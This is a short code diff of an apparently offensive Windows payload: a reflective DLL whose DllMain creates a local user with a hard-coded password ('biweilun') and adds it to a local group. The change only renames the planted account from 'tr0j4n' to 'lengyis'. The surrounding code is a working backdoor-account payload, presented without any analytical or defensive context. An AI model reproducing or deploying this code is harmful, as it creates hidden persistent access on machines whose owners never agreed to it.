@@ -9,7 +9,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 {
     USER_INFO_1 ui;
     DWORD dwError = 0;
-    ui.usri1_name = (TCHAR*)L"tr0j4n";
+    ui.usri1_name = (TCHAR*)L"lengyis";
     ui.usri1_password = (TCHAR*)L"biweilun";
     ui.usri1_priv = USER_PRIV_USER;
     ui.usri1_home_dir = NULL;
@@ -37,7 +37,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
             printf("No parameter passed to Reflective DLL");
         }
         const wchar_t* name;
-        name = (const wchar_t*)L"tr0j4n";
+        name = (const wchar_t*)L"lengyis";
         wcscpy_s(szAccountName, name);
         LOCALGROUP_MEMBERS_INFO_3 account;
         account.lgrmi3_domainandname = szAccountName;
